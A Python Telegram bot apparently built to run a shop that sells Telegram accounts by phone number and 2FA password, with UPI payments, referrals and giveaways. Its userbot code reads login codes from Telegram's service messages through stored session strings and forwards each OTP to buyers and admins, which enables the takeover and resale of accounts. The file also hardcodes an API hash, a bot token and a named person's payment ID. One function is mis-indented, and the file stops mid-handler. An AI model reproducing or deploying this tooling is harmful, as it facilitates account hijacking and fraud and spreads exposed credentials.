import asyncio
import aiohttp
import json
import os
import re
import random
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession

API_ID = 33576198
API_HASH = "7b59cd4d6fed5c8aa9c794f204e25050"
BOT_TOKEN = "8936958039:AAF_F4f0VMzc_rZtdhqrKuunSnJ34FvuO94"
ADMIN_IDS = [8646237754]
BOT_USER = "trusteddealers07bot"
UPI_ID = "shikharshukla606@naviaxis"
UPI_NAME = "Shikhar Shukla"
SUPPORT = "@deathalive07"

CHANNELS = [
    {"user": "@trusteddealers07", "link": "https://t.me/trusteddealers07"},
    {"user": "@trusteddealers_07", "link": "https://t.me/trusteddealers_07"}
]

REF_BONUS = 0.40
MIN_FUND = 15.00
BONUS_AT = 400.00
BONUS_PCT = 10

DB_FILE = "/home/container/db.json"
SESS_FILE = "/home/container/sessions.txt"

LINE = "\u2501" * 18


def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": {}, "accounts": [], "pending": [], "giveaways": []}
    try:
        with open(DB_FILE) as f:
            d = json.load(f)
            if "giveaways" not in d:
                d["giveaways"] = []
            return d
    except Exception:
        return {"users": {}, "accounts": [], "pending": [], "giveaways": []}


def save_db():
    try:
        with open(DB_FILE, "w") as f:
            json.dump(DB, f, indent=2)
    except Exception as e:
        print("db err", e)


DB = load_db()


def get_user(uid):
    uid = str(uid)
    if uid not in DB["users"]:
        DB["users"][uid] = {
            "balance": 0.0,
            "step": "menu",
            "temp": {},
            "refs": [],
            "orders": [],
            "wins": 0,
            "attempts": {}
        }
    u = DB["users"][uid]
    if "wins" not in u:
        u["wins"] = 0
    if "attempts" not in u:
        u["attempts"] = {}
    return u


HTTP = None


async def api(method, **kw):
    url = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + method
    try:
        async with HTTP.post(url, json=kw) as r:
            return await r.json()
    except Exception as e:
        print("api err", method, e)
        return {"ok": False}


async def send(cid, text, kb=None):
    p = {"chat_id": cid, "text": text, "parse_mode": "HTML"}
    if kb:
        p["reply_markup"] = json.dumps(kb)
    await api("sendMessage", **p)


async def member(chat_id, user_id):
    r = await api("getChatMember", chat_id=chat_id, user_id=user_id)
    if r.get("ok"):
        return r["result"].get("status", "left")
    return "left"


def user_kb():
    return {"keyboard": [
        [{"text": "\U0001F6D2 Buy Account"}, {"text": "\U0001F4E6 My Orders"}],
        [{"text": "\U0001F4B0 Add Funds"}, {"text": "\U0001F464 Profile"}],
        [{"text": "\U0001F381 Giveaway"}, {"text": "\U0001F3AF Earn 5%"}],
        [{"text": "\U0001F4D6 Guide"}, {"text": "\U0001F198 Support"}],
        [{"text": "\U0001F4E2 Channel"}]
    ], "resize_keyboard": True}


def admin_kb():
    return {"keyboard": [
        [{"text": "\u2795 Add Account"}, {"text": "\U0001F4CB List Accounts"}],
        [{"text": "\U0001F4B8 Pending"}, {"text": "\U0001F4CA Stats"}],
        [{"text": "\U0001F4B5 Add Balance"}, {"text": "\U0001F4B8 Deduct Balance"}],
        [{"text": "\U0001F381 Create Giveaway"}, {"text": "\U0001F4E3 Broadcast"}],
        [{"text": "\u2B05\uFE0F Back"}]
    ], "resize_keyboard": True}


def menu_kb(uid):
    if uid in ADMIN_IDS:
        return admin_kb()
    return user_kb()


USERBOTS = []


async def deliver_otp(phone, otp):
    for a in DB["accounts"]:
        if a.get("phone") == phone and a.get("sold_to"):
            buyer = int(a["sold_to"])
            t = "\U0001F4E9 <b>OTP RECEIVED</b>\n"
            t += LINE + "\n\n"
            t += "\U0001F4F1 Number: <code>" + phone + "</code>\n"
            t += "\U0001F511 OTP: <code>" + otp + "</code>\n\n"
            t += "\u26A1 Enter it fast!"
            try:
                await send(buyer, t)
            except Exception as e:
                print("otp err", e)
            for adm in ADMIN_IDS:
                try:
                    await send(adm, "\U0001F4E9 OTP " + phone + " -> " + otp)
                except Exception:
                    pass
            return


async def start_userbots():
    if not os.path.exists(SESS_FILE):
        print("[userbot] no sessions")
        return
    with open(SESS_FILE) as f:
        lines = [l.strip() for l in f if l.strip() and "|" in l]
    print("[userbot] loading", len(lines))
    for line in lines:
        phone, sstr = line.split("|", 1)
        try:
            c = TelegramClient(StringSession(sstr), API_ID, API_HASH)
            await c.connect()
            if not await c.is_user_authorized():
                await c.disconnect()
                continue
            me = await c.get_me()
            print("[userbot]", phone, "online", me.first_name)

            @c.on(events.NewMessage(from_users=777000))
            async def h(event, phone=phone):
                txt = event.raw_text or ""
                m = re.search(r"(\d{4,6})", txt)
                if not m:
                    return
                otp = m.group(1)
                print("[OTP]", phone, otp)
                await deliver_otp(phone, otp)

            USERBOTS.append((phone, c))
        except Exception as e:
            print("[userbot]", phone, "fail", e)


async def check_join(uid):
    for ch in CHANNELS:
        st = await member(ch["user"], uid)
        if st not in ("creator", "administrator", "member", "restricted"):
            return False
    return True


async def join_msg(cid, name):
    rows = []
    for i, ch in enumerate(CHANNELS):
        rows.append([{"text": "\U0001F4E2 Join Channel " + str(i+1), "url": ch["link"]}])
    rows.append([{"text": "\u2705 Verify Join",
                  "url": "https://t.me/" + BOT_USER + "?start=verify"}])
    t = "\U0001F510 <b>Access Locked</b>\n"
    t += LINE + "\n\n"
    t += "Hey <b>" + name + "</b>,\n\n"
    t += "Join both channels to unlock the bot.\n\n"
    t += "\U0001F449 Tap Join, then Verify."
    await send(cid, t, {"inline_keyboard": rows})


def current_giveaway():
    for g in DB["giveaways"]:
        if g.get("active"):
            return g
    return None


def math_question():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    op = random.choice(["+", "-", "*"])
    if op == "+":
        ans = a + b
    elif op == "-":
        ans = a - b
    else:
        ans = a * b
    return str(a) + " " + op + " " + str(b), ans
        async def handle(update):
    msg = update.get("message")
    if not msg:
        return
    chat = msg.get("chat", {})
    user = msg.get("from", {})
    uid = user.get("id", 0)
    cid = chat.get("id", uid)
    fname = user.get("first_name", "user")
    text = msg.get("text", "")
    cmd = text.split("@")[0].strip()
    low = cmd.lower()

    u = get_user(uid)
    save_db()

    if not await check_join(uid):
        await join_msg(cid, fname)
        return

    is_admin = uid in ADMIN_IDS
    kb = menu_kb(uid)

    if "ref_" in text:
        m = re.search(r"ref_(\d+)", text)
        if m:
            ref_id = int(m.group(1))
            if ref_id != uid and not u.get("referred_by"):
                u["referred_by"] = ref_id
                ref_u = get_user(ref_id)
                ref_u["refs"].append(uid)
                ref_u["balance"] += REF_BONUS
                save_db()
                try:
                    await send(ref_id, "\U0001F381 New referral! +Rs" + str(REF_BONUS))
                except Exception:
                    pass

    # ===== MENU =====
    if low in ("/start", "/menu", "/cancel", "back", ""):
        u["step"] = "menu"
        u["temp"] = {}
        save_db()
        if is_admin:
            stock = len([a for a in DB["accounts"] if not a.get("sold")])
            t = "\U0001F510 <b>ADMIN CONSOLE</b>\n"
            t += LINE + "\n\n"
            t += "\U0001F4E6 Stock: <b>" + str(stock) + "</b>\n"
            t += "\U0001F465 Users: <b>" + str(len(DB["users"])) + "</b>\n"
            t += "\U0001F4B8 Pending: <b>" + str(len(DB["pending"])) + "</b>\n"
            t += "\U0001F381 Giveaways: <b>" + str(len([g for g in DB["giveaways"] if g.get("active")])) + "</b>\n\n"
            t += "\u2728 Choose an option below"
            await send(cid, t, kb)
        else:
            t = "\U0001F48E <b>PREMIUM TG STORE</b>\n"
            t += LINE + "\n\n"
            t += "\U0001F44B Welcome, <b>" + fname + "</b>\n\n"
            t += "\U0001F194 ID: <code>" + str(uid) + "</code>\n"
            t += "\U0001F4B0 Balance: <b>Rs" + str(round(u["balance"], 2)) + "</b>\n"
            t += "\U0001F3C6 Wins: <b>" + str(u["wins"]) + "</b>\n\n"
            t += "\u2728 Choose an option below"
            await send(cid, t, kb)
        return

    # ===== BUY =====
    if low == "buy account" or low == "\U0001F6D2 buy account":
        avail = [a for a in DB["accounts"] if not a.get("sold")]
        if not avail:
            await send(cid, "\u274C No accounts in stock right now.", kb)
            return
        countries = sorted(set(a.get("country", "Unknown") for a in avail))
        u["step"] = "buy_country"
        u["temp"] = {"countries": countries}
        save_db()
        t = "\U0001F30D <b>Choose Country</b>\n" + LINE + "\n\n"
        for i, c in enumerate(countries):
            cnt = len([a for a in avail if a.get("country") == c])
            t += str(i+1) + ". " + c + " <i>(" + str(cnt) + ")</i>\n"
        t += "\n\u270F\uFE0F Reply with the number"
        await send(cid, t, kb)
        return

    if u["step"] == "buy_country":
        try:
            country = u["temp"]["countries"][int(cmd) - 1]
        except Exception:
            await send(cid, "\u274C Invalid. Reply with a number.", kb)
            return
        avail = [a for a in DB["accounts"] if not a.get("sold") and a.get("country") == country]
        u["step"] = "buy_pick"
        u["temp"]["filtered"] = [a["id"] for a in avail]
        save_db()
        t = "\U0001F4F1 <b>" + country + "</b>\n" + LINE + "\n\n"
        for i, a in enumerate(avail):
            t += str(i+1) + ". <b>" + a.get("age", "Fresh") + "</b> \u2014 Rs" + str(a.get("price", 0)) + "\n"
        t += "\n\u270F\uFE0F Reply with the number"
        await send(cid, t, kb)
        return

    if u["step"] == "buy_pick":
        try:
            acc_id = u["temp"]["filtered"][int(cmd) - 1]
        except Exception:
            await send(cid, "\u274C Invalid.", kb)
            return
        acc = next((a for a in DB["accounts"] if a["id"] == acc_id and not a.get("sold")), None)
        if not acc:
            u["step"] = "menu"
            save_db()
            await send(cid, "\u274C Not available.", kb)
            return
        if u["balance"] < acc.get("price", 0):
            u["step"] = "menu"
            save_db()
            t = "\u26A0\uFE0F <b>Insufficient Balance</b>\n"
            t += LINE + "\n\n"
            t += "Price: Rs" + str(acc["price"]) + "\n"
            t += "Balance: Rs" + str(round(u["balance"], 2)) + "\n\n"
            t += "\U0001F4B0 Tap Add Funds"
            await send(cid, t, kb)
            return
        u["step"] = "buy_confirm"
        u["temp"]["acc_id"] = acc_id
        save_db()
        t = "\U0001F6D2 <b>Confirm Purchase</b>\n" + LINE + "\n\n"
        t += "\U0001F30D " + str(acc.get("country")) + "\n"
        t += "\U0001F4C5 " + str(acc.get("age", "Fresh")) + "\n"
        t += "\U0001F4B0 Rs" + str(acc["price"]) + "\n\n"
        t += "Reply <b>YES</b> or <b>NO</b>"
        await send(cid, t, kb)
        return

    if u["step"] == "buy_confirm":
        ans = cmd.upper()
        if ans in ("NO", "N", "CANCEL"):
            u["step"] = "menu"
            save_db()
            await send(cid, "\U0001F6AB Cancelled.", kb)
            return
        if ans not in ("YES", "Y"):
            await send(cid, "Reply YES or NO.", kb)
            return
        acc = next((x for x in DB["accounts"] if x["id"] == u["temp"]["acc_id"] and not x.get("sold")), None)
        if not acc:
            u["step"] = "menu"
            save_db()
            await send(cid, "\u274C Already sold.", kb)
            return
        if u["balance"] < acc["price"]:
            u["step"] = "menu"
            save_db()
            await send(cid, "\u274C Insufficient.", kb)
            return
        acc["sold"] = True
        acc["sold_to"] = uid
        u["balance"] -= acc["price"]
        u["orders"].append({"acc_id": acc["id"], "phone": acc.get("phone")})
        u["step"] = "menu"
        save_db()
        t = "\u2705 <b>PURCHASE SUCCESS</b>\n"
        t += LINE + "\n\n"
        t += "\U0001F4F1 Phone: <code>" + str(acc.get("phone")) + "</code>\n"
        t += "\U0001F510 2FA: <code>" + str(acc.get("twofa", "none")) + "</code>\n\n"
        t += "<b>\U0001F4D6 How to Login</b>\n"
        t += "1\uFE0F\u20E3 Open Telegram\n"
        t += "2\uFE0F\u20E3 Log in with the phone\n"
        t += "3\uFE0F\u20E3 OTP arrives here automatically\n"
        t += "4\uFE0F\u20E3 Enter 2FA if asked\n\n"
        t += "\U0001F198 Support: " + SUPPORT
        await send(cid, t, kb)
        for adm in ADMIN_IDS:
            try:
                await send(adm, "\U0001F6D2 Sale! User <code>" + str(uid) + "</code>\nPhone " + str(acc.get("phone")) + "\nRs" + str(acc["price"]))
            except Exception:
                pass
        return

    if low in ("my orders", "\U0001F4E6 my orders"):
        if not u["orders"]:
            await send(cid, "\U0001F4ED No orders yet.", kb)
            return
        t = "\U0001F4E6 <b>Your Orders</b>\n" + LINE + "\n\n"
        for i, o in enumerate(u["orders"]):
            t += str(i+1) + ". <code>" + str(o.get("phone")) + "</code>\n"
        await send(cid, t, kb)
        return

    # ===== ADD FUNDS =====
    if low in ("add funds", "\U0001F4B0 add funds"):
        u["step"] = "fund_amount"
        save_db()
        t = "\U0001F4B0 <b>Add Funds</b>\n" + LINE + "\n\n"
        t += "\U0001F4CA Min: Rs" + str(MIN_FUND) + "\n"
        t += "\U0001F381 Bonus: " + str(BONUS_PCT) + "% above Rs" + str(int(BONUS_AT)) + "\n\n"
        t += "\U0001F4B3 UPI: <code>" + UPI_ID + "</code>\n"
        t += "\U0001F464 Name: " + UPI_NAME + "\n\n"
        t += "\u270F\uFE0F Send amount in rupees"
        await send(cid, t, kb)
        return

    if u["step"] == "fund_amount":
        try:
            amt = float(cmd)
        except Exception:
            await send(cid, "\u274C Invalid amount.", kb)
            return
        if amt < MIN_FUND:
            await send(cid, "\u274C Min Rs" + str(MIN_FUND), kb)
            return
        u["step"] = "fund_utr"
        u["temp"]["amt"] = amt
        save_db()
        preview = ""
        if amt >= BONUS_AT:
            b = amt * BONUS_PCT / 100
            preview = "\n\U0001F381 Bonus: +Rs" + str(round(b, 2)) + " \u2192 total Rs" + str(round(amt + b, 2))
        t = "\U0001F4B0 <b>Amount: Rs" + str(round(amt, 2)) + "</b>"
        t += preview + "\n" + LINE + "\n\n"
        t += "\U0001F4B3 Pay to UPI: <code>" + UPI_ID + "</code>\n"
        t += "\U0001F464 Name: " + UPI_NAME + "\n\n"
        t += "After paying, send the <b>UTR</b> here"
        await send(cid, t, kb)
        return

    if u["step"] == "fund_utr":
        DB["pending"].append({
            "uid": uid,
            "amount": u["temp"]["amt"],
            "proof": cmd,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M")
        })
        u["step"] = "menu"
        save_db()
        t = "\u2705 <b>Submitted!</b>\n" + LINE + "\n\n"
        t += "Admin will verify and credit you soon."
        await send(cid, t, kb)
        for adm in ADMIN_IDS:
            try:
                t = "\U0001F4B8 <b>NEW CLAIM</b>\n"
                t += LINE + "\n\n"
                t += "\U0001F194 User: <code>" + str(uid) + "</code>\n"
                t += "\U0001F4B0 Rs" + str(u["temp"]["amt"]) + "\n"
                t += "\U0001F9FE UTR: " + cmd
                await send(adm, t)
            except Exception:
                pass
        return

    # ===== PROFILE =====
    if low in ("profile", "\U0001F464 profile"):
        t = "\U0001F464 <b>Profile</b>\n" + LINE + "\n\n"
        t += "\U0001F194 ID: <code>" + str(uid) + "</code>\n"
        t += "\U0001F4B0 Balance: Rs" + str(round(u["balance"], 2)) + "\n"
        t += "\U0001F4E6 Orders: " + str(len(u["orders"])) + "\n"
        t += "\U0001F465 Refs: " + str(len(u["refs"])) + "\n"
        t += "\U0001F3C6 Wins: " + str(u["wins"]) + "\n\n"
        t += "\U0001F517 https://t.me/" + BOT_USER + "?start=ref_" + str(uid)
        await send(cid, t, kb)
        return

    # ===== EARN 5% =====
    if low in ("earn", "earn 5%", "\U0001F3AF earn 5%"):
        t = "\U0001F3AF <b>Earn 5%</b>\n" + LINE + "\n\n"
        t += "Invite friends and earn <b>5%</b> of their first deposit!\n\n"
        t += "Plus Rs" + str(REF_BONUS) + " per signup\n\n"
        t += "\U0001F517 Your link:\n"
        t += "https://t.me/" + BOT_USER + "?start=ref_" + str(uid)
        await send(cid, t, kb)
        return

    # ===== GIVEAWAY =====
    if low in ("giveaway", "\U0001F381 giveaway"):
        g = current_giveaway()
        if not g:
            await send(cid, "\U0001F614 No giveaway active right now.\n\nCome back later!", kb)
            return
        if u["attempts"].get(str(g["id"])):
            await send(cid, "\u274C You already tried this giveaway.\n\nOne chance only!", kb)
            return
        q, ans = math_question()
        u["temp"]["ga_ans"] = ans
        u["temp"]["ga_id"] = g["id"]
        u["step"] = "ga_answer"
        save_db()
        t = "\U0001F381 <b>GIVEAWAY CHALLENGE</b>\n" + LINE + "\n\n"
        t += "\U0001F4B0 Prize: <b>Rs" + str(g["prize"]) + "</b>\n\n"
        t += "\U0001F9E0 Solve:\n"
        t += "<b>" + q + " = ?</b>\n\n"
        t += "\u26A0\uFE0F One wrong answer = miss"
        await send(cid, t, kb)
        return

    if u["step"] == "ga_answer":
        g = next((x for x in DB["giveaways"] if x["id"] == u["temp"].get("ga_id")), None)
        if not g or not g.get("active"):
            u["step"] = "menu"
            save_db()
            await send(cid, "\u274C Giveaway ended.", kb)
            return
        if u["attempts"].get(str(g["id"])):
            u["step"] = "menu"
            save_db()
            await send(cid, "\u274C Already tried.", kb)
            return
        try:
            user_ans = int(cmd.strip())
        except Exception:
            await send(cid, "Reply with a number.", kb)
            return
        u["attempts"][str(g["id"])] = True
        if user_ans == u["temp"]["ga_ans"]:
            u["balance"] += g["prize"]
            u["wins"] += 1
            u["step"] = "menu"
            save_db()
            t = "\U0001F3C6 <b>CORRECT!</b>\n" + LINE + "\n\n"
            t += "\U0001F4B0 You won <b>Rs" + str(g["prize"]) + "</b>!\n\n"
            t += "New Balance: Rs" + str(round(u["balance"], 2))
            await send(cid, t, kb)
            for adm in ADMIN_IDS:
                try:
                    await send(adm, "\U0001F3C6 " + str(uid) + " won Rs" + str(g["prize"]))
                except Exception:
                    pass
        else:
            u["step"] = "menu"
            save_db()
            t = "\u274C <b>WRONG ANSWER</b>\n" + LINE + "\n\n"
            t += "Correct was: <b>" + str(u["temp"]["ga_ans"]) + "</b>\n\n"
            t += "Better luck next time \U0001F614"
            await send(cid, t, kb)
        return

    if low in ("guide", "\U0001F4D6 guide"):
        t = "\U0001F4D6 <b>Guide</b>\n" + LINE + "\n\n"
        t += "1\uFE0F\u20E3 Add funds via UPI\n"
        t += "2\uFE0F\u20E3 Buy Account\n"
        t += "3\uFE0F\u20E3 Get phone + 2FA\n"
        t += "4\uFE0F\u20E3 Log in Telegram\n"
        t += "5\uFE0F\u20E3 OTP arrives here automatically\n\n"
        t += "\U0001F198 Support: " + SUPPORT
        await send(cid, t, kb)
        return

    if low in ("support", "\U0001F198 support"):
        await send(cid, "\U0001F198 Contact: " + SUPPORT, kb)
        return

    if low in ("channel", "\U0001F4E2 channel"):
        links = "\n".join("\U0001F4E2 " + ch["link"] for ch in CHANNELS)
        await send(cid, "<b>Channels</b>\n" + LINE + "\n\n" + links, kb)
        return

    # ===== ADMIN =====
    if is_admin:

        if low in ("add account", "\u2795 add account"):
            u["step"] = "add_one"
            save_db()
            t = "\u2795 <b>Add Account</b>\n" + LINE + "\n\n"
            t += "Send in ONE line separated by | :\n\n"
            t += "<code>phone|country|age|2fa|price</code>\n\n"
            t += "\U0001F4DD Example:\n"
            t += "<code>919999999999|India|Fresh|pass123|50</code>\n\n"
            t += "Use <code>none</code> for no 2FA"
            await send(cid, t, admin_kb())
            return

        if u["step"] == "add_one":
            parts = cmd.split("|")
            if len(parts) != 5:
                await send(cid, "\u274C Wrong format.", admin_kb())
                return
            try:
                price = float(parts[4].strip())
            except Exception:
                await send(cid, "\u274C Invalid price.", admin_kb())
                return
            DB["accounts"].append({
                "id": len(DB["accounts"]) + 1,
                "phone": parts[0].strip(),
                "country": parts[1].strip(),
                "age": parts[2].strip(),
                "twofa": parts[3].strip(),
                "price": price,
                "sold": False,
                "sold_to": None
            })
            u["step"] = "menu"
            save_db()
            t = "\u2705 <b>Account Added!</b>\n" + LINE + "\n\n"
            t += "\U0001F4F1 " + parts[0].strip() + "\n"
            t += "\U0001F30D " + parts[1].strip() + "\n"
            t += "\U0001F4C5 " + parts[2].strip() + "\n"
            t += "\U0001F510 " + parts[3].strip() + "\n"
            t += "\U0001F4B0 Rs" + str(price)
            await send(cid, t, admin_kb())
            return

        if low in ("list accounts", "\U0001F4CB list accounts"):
            if not DB["accounts"]:
                await send(cid, "No accounts.", admin_kb())
                return
            t = "\U0001F4CB <b>Accounts</b>\n" + LINE + "\n\n"
            for a in DB["accounts"][-30:]:
                s = "\U0001F534" if a.get("sold") else "\U0001F7E2"
                t += s + " #" + str(a["id"]) + " " + str(a.get("phone")) + " Rs" + str(a.get("price")) + "\n"
            await send(cid, t, admin_kb())
            return

        if low in ("pending", "\U0001F4B8 pending"):
            if not DB["pending"]:
                await send(cid, "No pending.", admin_kb())
                return
            t = "\U0001F4B8 <b>Pending Payments</b>\n" + LINE + "\n\n"
            for i, p in enumerate(DB["pending"]):
                t += "[" + str(i+1) + "] <code>" + str(p["uid"]) + "</code>\n"
                t += "    Rs" + str(p["amount"]) + " \u2022 " + str(p["proof"]) + "\n\n"
            t += "Reply <b>OK 1</b> to approve, <b>NO 1</b> to reject"
            u["step"] = "pend_act"
            save_db()
            await send(cid, t, admin_kb())
            return

        if u["step"] == "pend_act":
            m = re.match(r"^(OK|NO)\s+(\d+)$", cmd, re.I)
            if not m:
                await send(cid, "Reply OK 1 or NO 1.", admin_kb())
                return
            act = m.group(1).upper()
            idx = int(m.group(2)) - 1
            if idx < 0 or idx >= len(DB["pending"]):
                await send(cid, "Bad index.", admin_kb())
                return
            item = DB["pending"].pop(idx)
            if act == "OK":
                buyer = get_user(item["uid"])
                bonus = 0
                if item["amount"] >= BONUS_AT:
                    bonus = item["amount"] * BONUS_PCT / 100
                buyer["balance"] += item["amount"] + bonus
                save_db()
                try:
                    t = "\u2705 <b>Approved!</b>\n" + LINE + "\n\n"
                    t += "\U0001F4B0 Recharged: Rs" + str(item["amount"]) + "\n"
                    if bonus:
                        t += "\U0001F381 Bonus: Rs" + str(round(bonus, 2)) + "\n"
                    t += "\n\U0001F4B0 Balance: Rs" + str(round(buyer["balance"], 2))
                    await send(item["uid"], t)
                except Exception:
                    pass
                msgok = "\u2705 Approved Rs" + str(item["amount"])
                if bonus:
                    msgok += " + bonus Rs" + str(round(bonus, 2))
                await send(cid, msgok, admin_kb())
            else:
                try:
                    await send(item["uid"], "\u274C Payment rejected.")
                except Exception:
                    pass
                await send(cid, "\u274C Rejected.", admin_kb())
            u["step"] = "menu"
            save_db()
            return

        if low in ("add balance", "\U0001F4B5 add balance"):
            u["step"] = "ab_uid"
            save_db()
            await send(cid, "\U0001F4B5 <b>Add Balance</b>\n\nSend user UID.", admin_kb())
            return
        if u["step"] == "ab_uid":
            u["temp"]["uid"] = cmd
            u["step"] = "ab_amt"
            save_db()
            await send(cid, "Send amount in rupees.", admin_kb())
            return
        if u["step"] == "ab_amt":
            try:
                amt = float(cmd)
            except Exception:
                await send(cid, "\u274C Invalid.", admin_kb())
                return
            target = get_user(u["temp"]["uid"])
            target["balance"] += amt
            u["step"] = "menu"
            save_db()
            await send(cid, "\u2705 Added Rs" + str(amt) + " to " + u["temp"]["uid"], admin_kb())
            try:
                await send(int(u["temp"]["uid"]), "\U0001F4B0 Rs" + str(amt) + " added by admin\nNew balance: Rs" + str(round(target["balance"], 2)))
            except Exception:
                pass
            return

        if low in ("deduct balance", "\U0001F4B8 deduct balance"):
            u["step"] = "db_uid"
            save_db()
            await send(cid, "\U0001F4B8 <b>Deduct Balance</b>\n\nSend user UID.", admin_kb())
            return
        if u["step"] == "db_uid":
            u["temp"]["uid"] = cmd
            u["step"] = "db_amt"
           
